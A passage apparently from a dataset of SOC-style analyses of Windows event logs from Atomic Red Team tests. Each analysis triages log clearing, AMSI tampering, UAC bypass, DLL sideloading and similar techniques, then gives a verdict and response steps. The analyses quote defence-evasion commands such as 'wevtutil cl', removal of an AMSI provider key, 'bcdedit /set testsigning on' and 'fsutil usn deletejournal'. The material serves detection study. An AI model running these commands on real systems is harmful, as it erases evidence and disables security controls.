     - `wevtutil.exe cl System`
     - `wevtutil.exe cl Security`
     - `wevtutil.exe cl ""Windows PowerShell""`
   - The presence of these commands at `2024-10-21 11:47:01` aligns with the timeframe of the log clearing events seen in other logs, exacerbating suspicion.

3. **Execution of Unusual or Suspicious Programs:**
   - The log entry for a cmd.exe process at `2024-10-21 11:47:02.2919256` utilized a potentially suspicious command via a path involving `AtomicRedTeam` and ExternalPayloads, running a binary `T1027.exe`. This is reminiscent of a technique for executing encoded or obfuscated payloads, a known evasion tactic.

4. **PowerShell Execution:**
   - The execution of PowerShell by the same user `admin_test` immediately before these events lacks specific command details but coupled with the suspicious context, amplifies the need for scrutiny.

5. **High Integrity Level Execution:**
   - Many of these processes, including `cmd.exe` and `wevtutil.exe`, were executed with ""High"" integrity levels, typically requiring administrative privileges, which could indicate a misuse of elevated privileges.

### Malicious Activity or Compromise Indicators:
- The combination of log-clearing activities using system utilities (`wevtutil.exe`), execution of suspicious and potentially obfuscating or persistence-focused software (T1027.exe), and the log-clearing events themselves, are strong indicators of potentially malicious activity aimed at hiding actions on the host.

### Assessment:
Based on the analysis of the logs, there are multiple indicators suggestive of malicious activity involving:
- Log-clearing operations aiming to conceal further activities.
- Usage of potentially malicious scripts and payloads.
- Elevated privilege usage in executing native Windows utilities.

Invoke HTML Application - JScript Engine with Inline Protocol Handler,"Upon reviewing the provided Windows event logs, several activities stand out as potentially suspicious and indicate possible malicious activity:

1. **Log File Clearing**: 
   - Multiple instances of log file clearing events (Event ID 104 and 1102) are recorded for the System, Windows PowerShell, and Security channels. The user ""admin_test"" is noted as the one clearing these logs. Clearing log files is often a tactic used by attackers to hide their activity and can be considered a red flag.

2. **Use of `wevtutil.exe`**:
   - The `wevtutil.exe` command line utility is being executed multiple times with the ""cl"" (clear) command targeting various event log channels (e.g., Sysmon, Security, Windows PowerShell). This is consistent with the log clearing events noted.

3. **Suspicious PowerShell Activity**: 
   - The logs indicate the execution of PowerShell with a command involving `Invoke-ATHHTMLApplication`, which is uncommon and suspicious. It mentions parameters like `-ScriptEngine JScript` and the use of `mshta.exe`. This could indicate an attempt to execute potentially malicious scripts or activities through PowerShell.

4. **Process Executions**:
   - Numerous `conhost.exe` processes are spawned by potentially malicious parent processes like `wevtutil.exe` and PowerShell scripts. While `conhost.exe` can be part of legitimate activity, its frequent spawning and its parent processes should be investigated further.

5. **General Pattern**:
   - The sampling of logs indicates a highly unusual pattern of system utility usage, generally associated with cover-up activities after a penetration or compromise. The combination of clearing logs, using PowerShell, and manipulating system processes like `conhost.exe` suggests an effort to manipulate the system's state surreptitiously.

**Assessment**: 
Based on these observations, the activity captured in the logs shows clear signs of a security breach or unauthorized actions. The behaviors are consistent with tactics used to cover tracks (such as clearing logs) and using scripts or utilities for potentially malicious purposes. 

**Resolution**: 
- **MALICIOUS**: The patterns identified strongly indicate malicious activity.

**Guidance on How to Proceed**:
1. **Immediate Action**: Isolate the affected host (Server002) from the network to prevent further potential compromise and data exfiltration.
2. **Full Forensics**: Conduct a detailed forensic analysis on the machine to uncover all activities, possible backdoors, and compromised accounts.
3. **Incident Response**: Notify the security incident response team to begin rectification and communication procedures.
4. **Review Access Controls**: Strengthen account controls and review access permissions to minimize the chances of similar compromises in the future.
5. **Log Monitoring & Alerting**: Enhance systems for real-time monitoring and alerting for illicit use of administrative tools and modification to event logs."
WinPwn - Kill the event log services for stealth,"### Detailed Analysis:

Upon reviewing the provided logs, certain events stand out as potentially suspicious and warrant further investigation:

1. **Event Log Clearing (Security and System Logs)**:
   - In the Security logs, we notice Event ID 1102 which indicates that the security event log was cleared by the `admin_test` user. This can be a sign of malicious activity as clearing logs is often an attempt to cover tracks after unauthorized actions.
   - Similarly, in the System logs, Event ID 104 also shows log clearing activities by the same user, again, suggesting potential tampering or cleanup efforts.

2. **Unusual PowerShell Activity**:
   - There is a noted PowerShell execution with a suspicious command from the Windows PowerShell logs. The command involves downloading and executing a PowerShell script from an external URL (`https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1`). This script seems to be related to a known GitHub repository used for penetration testing or exploitation, pointing towards possible system compromise.

3. **Suspicious Command-Line Activity**: 
   - The Sysmon logs show instances of `wevtutil.exe` commands for clearing logs such as ""cl Microsoft-Windows-Sysmon/Operational"", ""cl Application"", ""cl System"", and ""cl Security"". This further corroborates the log clearing actions already noted and might indicate malicious intent to obscure logging of activities.

4. **Service Stoppage**:
   - In the Application logs, there are events registered for the ""edgeupdate"" service being stopped twice in rapid succession. While `edgeupdate` is a legitimate service by Microsoft, anomalous patterns or frequencies in service stoppage could be a point of interest for further correlation with other incidents.

5. **Elevation and Execution of Potentially Malicious Code**:
   - High integrity levels for user `SERVER002\admin_test` indicate the execution of commands with elevated privileges, which combined with the unauthorized PowerShell commands, pose a heightened risk of malicious activity.

### Threat Assessment:

- **Indicators of Compromise**:
  - The combination of log clearing, use of PowerShell for fetching and running external scripts, and execution of system utilities to manipulate logs are indicative of potentially malicious activities targeting to escalate privileges, execute unauthorized code, and subsequently cover traces.

### Recommended Actions:

1. **Immediate Incident Response**:
   - Quarantine the affected host (Server002) to prevent further propagation of potential threats.
   - Inform relevant stakeholders and initiate an incident response protocol to determine the scope and impact.

2. **Forensic Investigation**:
   - Capture memory and disk images for detailed forensic analysis.
   - Analyze PowerShell scripts downloaded and executed to understand their intention and impact.

AMSI Bypass - Remove AMSI Provider Reg Key,"Upon reviewing the provided logs, several indicators necessitate closer examination due to potential security concerns. Let's evaluate the logs step-by-step:

### Suspicious Activities:
1. **Log Clearance Events**:
   - Multiple system, application, and PowerShell logs have been cleared. This is commonly seen in attempts to cover tracks following unauthorized or malicious activities.
     - EventID 104: Logs cleared by ""admin_test"" in the ""System"" and ""Windows PowerShell"" channels.
     - Security EventID 1102: Security logs cleared by the same user.
   - These events are executed by the user ""admin_test,"" indicating potential misuse of administrative privileges.

2. **PowerShell Command Execution**:
   - A PowerShell command executed to remove registry entries associated with AMSI (Antimalware Scan Interface) providers:
     ```
     PowerShell Command: Remove-Item -Path ""HKLM:\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFE}"" -Recurse
     ```
   - This action aims to disable or tamper with security features, suggesting an attempt to circumvent antivirus or other security measures.

3. **Usage of `wevtutil`**:
   - The frequent execution of `wevtutil.exe` is used to clear specific event logs (Application, System, Security, and Sysmon logs).
   - A pattern that aligns with efforts to remove traces of activity.

4. **Execution of `whoami` and `hostname`**:
   - These commands gather information about the current session and user context, which could be consistent with reconnaissance activities often precedented in malicious actions.

### Assessment:
Given the aforementioned activities, these actions are not typical of regular administrative tasks and align more closely with behavior aimed at obscuring malicious actions by clearing logs, disabling security measures, and performing reconnaissance.

### Resolution:
**MALICIOUS** - The logs exhibit clear evidence of potentially malicious activities, including the clearing of critical security logs, disabling of antimalware interfaces via PowerShell, and possible reconnaissance steps with privilege misuse. These activities suggest a significant security incident that may involve unauthorized access or privileged abuse.

### Guidance:
1. **Immediate Steps**:
   - Isolate the affected system (Server002) to prevent further unauthorized actions.
   - Conduct a thorough investigation and forensics analysis on the system to identify the extent of compromise and identify any backdoor access or persistent threats.
   - Verify integrity and verify the modifications made to the system, especially focusing on registry and security configurations.
   
2. **Long-term Measures**:
   - Review and tighten access controls, especially for accounts with administrative privileges.
   - Implement enhanced monitoring and alerting for log clearance activities and anomalies related to AMSI tampering.
   - Conduct a broader security review of your network to assess potential lateral movement or additional compromises.

Adding custom paths for application execution,"Upon reviewing the provided logs from a Windows system, several suspicious activities are evident, which collectively suggest potential malicious behavior:

### Analysis:

1. **Log Clearing Activities**:
   - **Event ID 104 (Windows Event Log)**: Indicates that the logs are being cleared by the user `admin_test`. This is typically a red flag as adversaries often clear logs to cover their tracks. Specifically, logs for the System and Windows PowerShell channels are cleared almost simultaneously, suggesting intentional log destruction.
   - **Event ID 1102 (Security Log)**: The security log was also cleared by the same user. This corroborates with the aforementioned log clearing activities and raises further suspicion of malicious intent.

2. **Suspicious Command Line Execution**:
   - **Sysmon Event ID 1**: Execution of `wevtutil.exe cl` followed by the clearing of various log channels (Microsoft-Windows-Sysmon/Operational, Application, and Security). The use of `wevtutil` to clear logs is a common technique for attackers to erase traces of their activity.

3. **Registry Modification**:
   - **Sysmon Event ID 1**: A `cmd.exe` process executed a command to modify the registry, setting `msedge.exe` to run `notepad.exe`. This is atypical behavior and suggests an attempt to hijack the execution of a legitimate application, potentially for persistence or lateral movement.

4. **Execution of Utilities (whoami, hostname)**:
   - The execution of `whoami.exe` and `hostname.exe` by the same user can suggest an attempt to gather system and user information. While these might not always indicate malicious activity on their own, combined with log clearing and registry modifications, they contribute to the suspicion.

5. **High-Level Privileges and Logon Activities**:
   - **Security Event ID 4624 and 4672**: The presence of privileged logons and the acquisition of several high-level privileges (e.g., SeDebugPrivilege, SeTakeOwnershipPrivilege) by `admin_test` suggests elevation of privileges, which might not be legitimate unless justified by a valid administrative operation.

### Risk Assessment:
The cumulative evidence points to an attempt to cover tracks and modify system configurations potentially for unauthorized access or persistence. Clearing logs, modifying the registry, and the execution of commands like `wevtutil` and `registry changes` using `cmd.exe` are part of a common tactic used by malicious actors.

### Resolution:
Given the analysis, this activity is classified as **MALICIOUS**. There is clear evidence of actions typically associated with malicious activities, including log clearing and unauthorized registry alterations. Immediate steps should be taken to:
- Isolate the affected host (Server002) from the network to prevent potential lateral movement.
- Conduct a full forensic analysis to understand the extent of the compromise.
- Verify the legitimacy of user `admin_test` and check the timeline and context of their activities.
- Review and strengthen security policies, potentially including disabling the ability for local users to clear logs, among others.
- Implement additional monitoring and alerting to detect similar behaviors in the future."
Modify EnableBDEWithNoTPM Registry entry,"Upon reviewing the provided Windows event logs, there are several entries that warrant further examination due to their potential indication of suspicious activity.

### Suspicious Activities:
1. **Event Log Clearing:**
   - The logs show multiple instances of the `wevtutil.exe` utility being executed with the command line arguments `cl System`, `cl Application`, and `cl ""Windows PowerShell""`. These command lines indicate the clearing of event logs.
   - This activity is corroborated by Event ID 104 in the System log, showing that the system, application, and PowerShell logs were cleared by a user named `admin_test`. Additionally, the Security log shows Event ID 1102, indicating the Security log was cleared.
   - Clearing event logs is often a technique used by attackers to cover their tracks after conducting malicious activities.

2. **Suspicious Registry Change:**
   - There is an event showing `cmd.exe` executing a command to modify the registry key `HKLM\SOFTWARE\Policies\Microsoft\FVE`, specifically adding the value `EnableBDEWithNoTPM`. Altering registry settings related to BitLocker without a TPM might point to a potential effort to weaken device encryption.

3. **Execution of System Utilities:**
   - Spike in the execution of system utility processes like `cmd.exe`, `reg.exe`, and `conhost.exe`, along with elevated privileges (High integrity level) by `SERVER002\admin_test`, suggests possible unauthorized or escalated activities.

### Assessment:
- The presence of log clearing events, especially across all major logs (System, Application, Security, and PowerShell), is highly suspicious. Legitimate administrative tasks typically do not involve clearing logs, especially without a recorded explanation or system maintenance notification.
- The adjustments to registry settings related to encryption protocols without a TPM serve as indicators that someone might be trying to manipulate security settings.

### Resolution:
Based on these observations and the potential for log tampering and security setting manipulation, the activity is best classified as **SUSPICIOUS**. This classification is due to the notable signs of possible cover-up activity and unauthorized changes to security-relevant settings. 

### Guidance for Proceeding:
1. **Immediate Actions:**
   - Isolate the system (Server002) from the network to prevent further unauthorized access or spread of a potential breach.
   - Perform a comprehensive scan using advanced threat detection tools to identify any known malware or anomalies.
   - Retrieve a backup or shadow copies of the event logs if available, or other monitoring logs that may have recorded the system’s activities.

2. **Investigation:**
   - Determine the source of the log-clearing commands and registry modifications. This could involve investigating the `admin_test` user's recent actions, login history, and any possible credential compromises.
   - Review other systems on the same network to check if similar suspicious activities have occurred.

3. **Post-Incident Measures:**
   - Enhance the auditing and monitoring measures to detect and alert on log-clear events and unauthorized registry changes.
   - Reinforce security policies, including least privilege principles and stricter access control for administrative tools like `wevtutil.exe`."
Code Signing Policy Modification,"Upon analyzing the provided Windows event logs, we can observe several key points of potential interest with respect to suspicious or anomalous behavior:

1. **Log Clearing Events**: There are multiple entries indicating that logs have been cleared by the user ""admin_test"" on ""SERVER002"". Specifically, system logs, Windows PowerShell logs, and security logs were cleared. The use of the `wevtutil` command-line utility to clear specific logs is notable:
   - Sysmon log entry for `wevtutil.exe` (`EventID: 1`) showing it clearing logs, such as ""Microsoft-Windows-Sysmon/Operational"". This activity is often associated with attempts to hide potentially malicious operations and is a red flag for further investigation.

2. **Command Execution with High Integrity Level**: There are command-line executions involving `cmd.exe` with suspicious command-line arguments:
   - The command `bcdedit /set testsigning on` was executed, which is unusual if not part of a normal administrative task and may indicate an attempt to modify boot configurations.

3. **Activity Timing and Source Account**: These actions are all performed in a very short time frame by a user with administrative privileges, which can be indicative of automated script or tool usage.

4. **Usage of Microsoft Edge Update Utilities**: There are a number of logs associated with Microsoft Edge Update processes, shown running as `NT AUTHORITY\SYSTEM`. While these appear to be legitimate updates, the timing and frequency may necessitate validation with standard update schedules and policies.

### Assessment:

The presence of log-clearing events executed by an administrative account (`admin_test`) using a high integrity level process such as `wevtutil.exe`, coupled with the execution of potentially risky commands (`bcdedit`), strongly suggests the possibility of malicious activity. The rapid succession of actions and clearing of multiple log sources can indicate an attempt to cover tracks after unauthorized access.

### Resolution:

Based on the evidence presented in the logs:
- **Resolution**: **MALICIOUS**

### Guidance:

Immediate actions are recommended as follows:
1. Conduct a full incident response investigation on ""SERVER002"" to determine the scope of potential compromise, including memory analysis and network activity correlation.
2. Consider isolating the affected system until a thorough investigation can be completed.
3. Review the privileges and recent activities associated with the user account ""admin_test"" and examine any changes or anomalies in user or system behavior.
4. Verify and tighten endpoint security measures and logging policies to detect and prevent any further unauthorized actions.
5. Assess the need for breach notification and communicate with stakeholders as appropriate, based on findings.

Prompt steps need to be taken to assess the impact and recover any compromised or misconfigured systems."
Indicator Removal using FSUtil,"Upon reviewing the provided logs, I've identified some findings that suggest potential security concerns:

### Key Findings:

1. **Log Clearing Activities:**
   - The `EventID 104` from the System log indicates that the event logs were cleared by the user `admin_test` for both ""System"" and ""Windows PowerShell"". Similarly, `EventID 1102` from the Security log shows that the security logs were also cleared by the same user. This kind of activity is often associated with attempts to cover tracks following unauthorized access or other malicious activities.

2. **Process Execution:**
   - Multiple instances of `wevtutil.exe` (Windows Event Logging Utility) are used for clearing logs (`CommandLine: ""C:\\Windows\\system32\\wevtutil.exe"" cl`) for Application, System, and Security logs. While `wevtutil.exe` is a legitimate tool, its use to clear logs aligns with behaviors to obfuscate actions.

3. **Command Line Utilization:**
   - Commands like `cmd.exe /c fsutil usn deletejournal /D C:` indicate the deletion of the USN (Update Sequence Number) change journal. This is a technique used by attackers to hide file deletion or modifications, which is highly suspicious in a security context.

4. **User Account Examination:**
   - Events show that user groups associated with `admin_test` and other accounts were audited (`EventID 4798`). This may suggest reconnaissance or auditing activities post-compromise possibly to evaluate what accounts have administrative privileges.

5. **Scheduled Tasks and Regular System Activities:**
   - Other processes and tasks executed, such as `taskhostw.exe` and more common Windows processes (like `svchost.exe`, `rundll32.exe`, and `conhost.exe`) running under the `NT AUTHORITY\SYSTEM` account appear regular, but within the context of the log manipulation and credential enumeration, these might also warrant closer inspection.

### Assessment:

- **Resolution:** **MALICIOUS**

Given the evidence of log clearing, potential intentional hiding of file changes, and investigating user accounts, there is a high probability that malicious activity has occurred. The sequence of events, tools used, and activities align with methods typically employed by attackers to cover their tracks and conduct post-exploitation activities.

### Guidance on How to Proceed:

1. **Immediate Response:**
   - Isolate the affected host (Server002) from the network to prevent any potential lateral movement or exfiltration of data.
   - Preserve the current state of logs, disk, and RAM for further forensic analysis.

2. **Incident Investigation:**
   - Conduct a thorough investigation into how the `admin_test` account was compromised.
   - Investigate any other potential unauthorized access or actions on other systems.

3. **System Hardening:**
   - Review and modify access controls and privileges, especially for administrative accounts.
   - Ensure enhanced logging and monitoring are in place going forward, possibly leveraging an SIEM solution for better analysis capabilities.

4. **Remediation:**
   - Re-assess security configurations, patches, and update the intrusion detection systems to better detect similar activities in the future.
   - Consider user education and security awareness programs to prevent social engineering attacks targeting credentials. 

These steps are crucial in addressing the immediate threat, understanding the extent of compromise, and preparing the organization against similar scenarios in the future."
Disable Remote Desktop Security Settings Through Registry,"### Detailed Analysis of the Logs:

#### **Suspicious or Anomalous Behavior:**

1. **Event Log Deletion Activities:**
   - The events from the security log (EventID 1102) and system log (EventID 104) indicate that the event logs were cleared. Specifically, the use of `wevtutil.exe` to clear the logs (Sysmon EventID 1 and 5) is a notable anomaly. This action is often associated with attempts to hide malicious activity.
   - The logs show that these actions were performed by the user ""admin_test."" Although this could occur during routine administrative activity, the timing and frequency of log clearance suggest an attempt to remove traces of actions potentially related to unauthorized system changes or access.

2. **Privilege Escalation and Potential Misuse:**
   - The ""admin_test"" account was observed gaining multiple high-level privileges (Security Log EventID 4672). Privileges such as `SeSecurityPrivilege`, `SeBackupPrivilege`, and `SeTakeOwnershipPrivilege` are particularly sensitive and indicate potential intent to manipulate system settings or access protected resources.
   - There is an observed NTLM logon type 3 from IP address `192.168.0.102` (Security Log EventID 4624), which suggests a network-based access attempt.

3. **Registry Modification:**
   - An attempt was made to modify registry settings potentially affecting Terminal Services (Sysmon EventID 1). The command executed via `cmd.exe` was to change a registry key using `reg.exe`, which disables security settings. Such modifications are a red flag indicating malicious intent aiming to weaken system security for remote access or persistence mechanisms.

4. **Time Manipulation:**
   - Events show time changes being executed on the system via `svchost.exe` (Kernel-General EventID 1). While not inherently malicious, time changes can be utilized to mislead log timestamps, complicating forensic analysis.

#### **Assessment of the Situation:**

Based on the events summarized:
- The simultaneous execution of log clearance, privilege elevation, and registry manipulation combined with network logons from an external IP address suggests a sophisticated attempt to compromise the system.

#### **Threats or Risks Identified:**
- **Log Manipulation:** Indicates an attempt to erase evidence of potentially unauthorized or malicious activities.
- **High-Level Privileges:** Could enable an attacker to exert substantial control over the system.
- **Registry Modifications:** Suggest attempts to alter system security configurations, potentially leaving the system vulnerable to remote access or further compromise.

#### **Guidance on How to Proceed:**

1. **Immediate Security Measures:**
   - Isolate server ""Server002"" from the network for further analysis to prevent further unauthorized access.
   - Conduct a full forensic analysis, examining disk footprints and memory captures for traces of malware or unauthorized tools.

2. **Account and Credential Review:**
   - Assess the ""admin_test"" account for unauthorized configurations or use.
   - Review and possibly reset network access controls and credential policies.

3. **Monitoring and Alerting:**
   - Enable full auditing and advanced monitoring on the server.
   - Implement intrusion detection/prevention systems to strengthen monitoring across the network.

4. **Log Management Practices:**
   - Reinforce logging policies ensuring tamper-evidence and real-time log capture to a centralized secure location.

### Final Resolution:
**MALICIOUS** - The logs contain activities that strongly indicate malicious behavior, specifically targeting security and event logs, high-level privileges acquisition, and suspicious registry modifications. These actions suggest compromise, warranting further comprehensive investigation and response efforts."
WINWORD Remote Template Injection,"Upon analyzing the provided logs, here's a detailed assessment:

### Indicators of Potential Malicious Activity:

1. **Event Log Clearance:**
   - **Security Log (Event ID 1102)** and **System Log (Event ID 104)** entries indicate that the logs for the `Security`, `System`, and `Windows PowerShell` channels have been cleared by the user `SERVER002\admin_test`. Log clearance, especially covering these critical logs, is a significant red flag as it is often a technique used to cover tracks after malicious activity.
   - The commands executed to clear the logs (using `wevtutil.exe`) align with known methods to delete Windows event logs, often associated with suspicious activities.

2. **Execution of System Utilities:**
   - Multiple instances of `wevtutil.exe` (an Event Viewer command-line utility) and `conhost.exe` (Console Windows Host) being executed by `admin_test`. The command lines show attempts to clear logs, indicated by commands like `\""cl\""` which stands for clear log. 
   - High Integrity Level on these executions of PowerShell, cmd, and wevtutil could indicate the use of administrative privileges.

3. **Time Synchronization (Event ID 4616 and System Log Entries):**
   - Multiple `Microsoft-Windows-Security-Auditing` (Event ID 4616) entries show time change events. While these are not uncommon and can be benign (like syncing with an NTP server), when combined with log clearance, this could indicate attempts to tamper event log timestamps or align actions with altered time records.

4. **Execution of WHOAMI:**
   - The execution of `whoami.exe` and `hostname.exe` are typically used to enumerate the environment or confirm credentials. While not inherently malicious, their context here is worth noting given the other activities.

5. **Suspicious PowerShell Activity:**
   - While the provided logs mention the clearance of the Windows PowerShell log, there are no actual logs for PowerShell activity, indicating potential PowerShell command execution that was either not logged or has been cleared.

### Conclusion:
The sequence of events, coupled with the usage of `wevtutil` and the clearance of crucial logs, along with potential misuse of system utilities, strongly suggest suspicious behavior possibly indicative of log tampering or an attempt to clean up traces of compromise.

### Recommendations:
- **Resolution: SUSPICIOUS** - The observed activities do not definitively confirm malicious actions but strongly suggest the need for further investigation.
- **Guidance:**
  - Investigate the origin and intent behind the log clearance and assess if this aligns with authorized administrative tasks.
  - Review user `admin_test`'s recent activities, especially around the time of these events, and validate their need for such operations.
  - Perform a comprehensive security posture review to identify potential ongoing vulnerabilities or unauthorized access.
  - Consider deploying or updating host-based monitoring tools to detect and alert on similar future activities."
SyncAppvPublishingServer Signed Script PowerShell Command Execution,"Based on the analysis of the provided Windows event logs across various log categories (Application, Security, Sysmon, and System), here is a detailed analysis:

### Suspicious or Anomalous Behavior:
1. **Clear Evidence of Log Clearning**:
   - Security Event ID `1102`: Security logs cleared by the user `admin_test`. This is a critical indicator of possible malicious behavior as it suggests an attempt to erase traces.
   - System Event ID `104`: System and Windows PowerShell logs were cleared by the same user, `admin_test`. This reinforces the suspicion of log tampering activities.

2. **Wevtutil Execution**:
   - Multiple instances of `wevtutil.exe` from Sysmon logs indicating the clearing of logs (`""cl""` command) were executed by the `admin_test` user with high integrity. The tool `wevtutil.exe` is typically used to manage event logs and being used by a non-system process to clear logs is suspicious.

3. **Execution of Potentially Malicious Commands**:
   - A `cmd.exe` process executing a command `/c C:\\windows\\system32\\SyncAppvPublishingServer.vbs ""\\n;Start-Process calc""` suggests script execution possibly for malicious purposes.
   - The explicit use of a script to start processes (e.g., `calc`) could be indicative of code injection or evasion attempts.

4. **Process Mischief**:
   - A notable process sequence showing `whoami.exe` being run, commonly used by attackers to check their privileges on a compromised host.

5. **Edge Update Oddities**:
   - Several EdgeUpdate-related processes, showing version handling and multiple executions, which could be part of legitimate updates. However, given the suspicious log clearing activity and the ""Temp"" directory interactions, further scrutiny is required.

### Malicious Activities or Compromise Indicators:
- The clearing of logs is highly indicative of an attempt to cover tracks and possibly hide malicious activities. This is a prominent tactic seen in post-exploitation scenarios and raises a serious red flag.
- The sequence and timing of events, especially around `wevtutil.exe` usage and command executions in the `cmd.exe` context, point towards concerted efforts to manipulate or degrade system trustworthiness.

### Assessment & Guidance:
- **Resolution**: **MALICIOUS**
  - The clearings of event logs relating to security, system, and PowerShell, particularly by a non-system user, are substantial indicators of malicious activity. Additionally, the execution of scripts and manipulations within command line contexts align with known malicious techniques.

### Next Steps:
1. **Immediate Incident Response**:
   - Isolate the impacted system (Server002) from the network to prevent potential lateral movement or data exfiltration.
   
2. **Forensic Investigation**:
   - Conduct a full memory and disk forensic analysis on Server002 to identify any malicious payloads or scripts left by attackers.
   - Analyze network logs to trace any outbound connections for potential data exfiltration.

3. **Review and Audit Privileges**: 
   - Review any recent changes to user accounts and ensure practices of least privilege.
   - Investigate the legitimacy of `admin_test` account actions and ensure it is secure against unauthorized access.

4. **Strengthen Monitoring**:
   - Monitor event logs for similar patterns and implement alerts for activities such as log clearing and suspicious command execution.
   - Utilize advanced threat detection tools to identify similar anomalies automatically.

5. **Patch Management & Update Verification**:
   - Verify the completion and authenticity of recent software updates, especially with Microsoft Edge applications.

6. **Security Awareness**:
   - Conduct training sessions for staff on recognizing phishing attempts or unusual system behaviors leading to unauthorized access.

The combination of these actions should help in mitigating any immediate threats while preventing future incidents of similar nature."
Disable Windows Notification Center,"Upon reviewing the provided Windows event logs, several activities were noted, which may indicate potential malicious actions:

1. **Clearing of Event Logs:**
   - There are multiple instances of event logs being cleared:
     - Sysmon log entries showing instances of ""wevtutil.exe"" being used to clear logs, including those related to ""Microsoft-Windows-Sysmon/Operational,"" ""Application,"" and ""Security.""
     - System logs also confirm the clearing of event logs, as shown by EventID 104, with the ""LogFileCleared"" action, indicating that logs for the ""System"" and ""Windows PowerShell"" channels were cleared.

2. **Registry Modifications:**
   - A command is executed via ""cmd.exe"" to modify the registry: `reg add HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Explorer /v DisableNotificationCenter /t REG_DWORD /d 1 /f`. This could be an attempt to disable the notification center, often seen as suspicious if there's no valid administrative context or documentation.

3. **Time Tampering:**
   - There are indications of the system time being altered as highlighted by the security logs (EventID 4616). Time changes can be used to evade detection by modifying timestamps or potentially backdate malicious actions.

4. **Use of System Tools:**
   - Commands involving system tools like ""hostname.exe"" and ""whoami.exe"" were also logged. While these tools can be legitimately used for administrative tasks, their presence in this sequence may be part of a reconnaissance activity by an unauthorized user to gather information about the host environment.

5. **Microsoft Edge Update Behavior:**
   - Multiple executions of ""MicrosoftEdgeUpdate.exe"" are visible. This type of automated update activity may be benign, but the unusual pattern or frequency could provide room for examining whether these updates were being misused as a cover for malicious actions, especially given the context provided by other behaviors.

**Assessment:**
The presence of cleared logs, registry modifications without known context, time tampering, and potential reconnaissance activities points toward suspicious behavior. Together with the usage of legitimate system tools for potential unwanted actions and a facade of normal update activity could indicate attempts to obfuscate malicious activities.

**Final Resolution: SUSPICIOUS**

Given the combination of log-clearing activities, system enumeration, and registry key manipulation, further investigation is warranted. The situation requires additional context on who performed these actions and whether they align with legitimate administrative operations or indicate unauthorized access. Recommendations include:
- Evaluating the necessity and authorization of these actions.
- Checking for patterns of unauthorized access or anomalies in user behavior surrounding these timestamps.
- Considering enhanced monitoring and detection for unusual process execution and system changes.
- Conducting interviews or context validation with responsible administrative teams."
UACME Bypass Method 59,"In the inspection of the provided Windows event logs, several activities suggest potential malicious behavior. Here's a detailed account of the analysis:

1. **Windows PowerShell & Application Logs Analysis:**
   - The PowerShell log is empty, which is an initial anomaly, as it does not contribute to any logs which is unusual.
   - Multiple ""edgeupdate"" service stoppages are noted, which could occur during regular updates, but could also indicate that services are being disrupted deliberately. However, there's no direct evidence it was malicious.

2. **System Logs:**
   - The ""Microsoft-Windows-Eventlog"" logs were cleared by a user named ""admin_test"". Event ID 104 indicates a log file was cleared, which is a significant indicator of potential log tampering often used to cover up malicious actions.

3. **Security Logs:**
   - Similar to system logs, the security log (Event ID 1102) was also cleared by the user ""admin_test"". This action is often associated with attempts to remove traces of malicious activities.

4. **Sysmon Log Analysis:**
   - A command line execution of `cmd.exe` with suspicious arguments noted at timestamp 18:20:53. This includes references to ""AtomicRedTeam"" and an executable ""Akagi64.exe"", suggestive of potential Unauthorized Access Control manipulation tools utilized for privilege escalation.
   - Numerous `wevtutil.exe` processes are seen clearing log files. This corroborates with System and Security log entries. The tool's command lines show the clearing of Application, System, and Security logs.
   - Files in the ""C:\Users\ADMIN_~1\AppData\Local\Temp\AtomicRedTeam\..\"" directory indicate a potential use of Atomic Red Team tests, possibly simulating attack behaviors.
   - Following these, there's a significant amount of `MicrosoftEdgeUpdate` activity. While this may seem normal, its timing following log clear events warrants close attention. Observed behaviors and parent-child relationships mostly align with updating processes, but the frequency and timing with the previous hypothetically malicious actions pose an elevated risk without corroborative benign intent.
   - The execution of `whoami.exe`, `hostname.exe`, and another `cmd.exe` confirms the stance of discovery, possibly part of post-exploitation tactics. These executions aim to gather information about the system and user context.

**Conclusion and Resolution:**
- **Resolution:** MALICIOUS
- **Threats/Risks Identified:**
  - Clearing of various logs by user ""admin_test"", which is a strong indicator of potential malicious attempt to hide activities.
  - Executions that suggest attempts to escalate privileges or simulate malicious activities.
- **Guidance on How to Proceed:**
  - Immediate isolation of ""Server002"" to prevent potential lateral movement by an assailant.
  - Conduct a full forensic investigation to identify any additional indicators of compromise (IOCs) or malicious payloads.
  - Examine any network flow logs or other systems' logs for correlated suspicious activities.
  - Consult with your incident response team to determine the scope and integrity impact.
  - Review user account activities associated with ""admin_test"" for any misuse or unauthorized activities.

This evaluation underscores the potential for a compromised host and calls for swift action to mitigate further security risks."
"DLL Search Order Hijacking,DLL Sideloading Of KeyScramblerIE.DLL Via KeyScrambler.EXE","Upon thorough examination of the provided logs, several observations can be made:

### Suspicious Activities Observed:

1. **PowerShell Activity**:
    - A script was executed via PowerShell that involved downloading and executing a file named `KeyScrambler_Setup.exe` from the internet. This is potentially suspicious due to the nature of using PowerShell for downloading and executing scripts, which is a common tactic for malware distribution. Additionally, the script mentioned ""A modified KeyScramblerIE.dll can be copied to temp, which can be misused by Attacker,"" indicating a possible exploitation or vulnerability.

2. **Event Log Clearing**:
    - Security and system logs were cleared by the user `SERVER002\admin_test` shortly after the PowerShell script execution. Event IDs 1102 in Security log and 104 in System log indicate log clearance. This could indicate an attempt to cover tracks after potentially malicious activities.

3. **Svchost.exe Processes and Time Changes**:
    - There are unusual `svchost.exe` processes and time change events (Event ID 4616). While not always indicative of malicious activity, combined with other findings, they warrant further investigation to rule out tampering.

4. **Installation and Use of Kernel Mode Driver**:
    - The service `KeyScrambler` was installed as a kernel mode driver (Event ID 7045 in the System log). Kernel drivers run with high privileges, and unnecessary drivers may pose security risks, especially if not from a trusted source.

5. **Execution of Many `regsvr32.exe` Instances**:
    - Multiple instances of `regsvr32.exe` (a legitimate Windows utility often misused for executing scripts and binaries) were observed registering and unregistering DLLs related to KeyScrambler. This repeated activity could be consistent with attempts to manipulate system configurations or load malicious DLLs.

6. **Edge Update and Other System Processes**:
    - There were system-related processes that involve Microsoft Edge updates. While these could be legitimate, the timing and sequence of these events, combined with the anomalous activities observed, need context for potential compromise.

Mshta executes VBScript to execute malicious command,"Upon reviewing the provided Windows event logs, the following observations have been made:

### Analysis:

1. **Log Clearing Events:**
   - The logs indicate multiple instances where the event logs for `System`, `Windows PowerShell`, and `Security` channels have been cleared by the user ""admin_test"". Notably:
     - System log cleared at `13:53:26.818`.
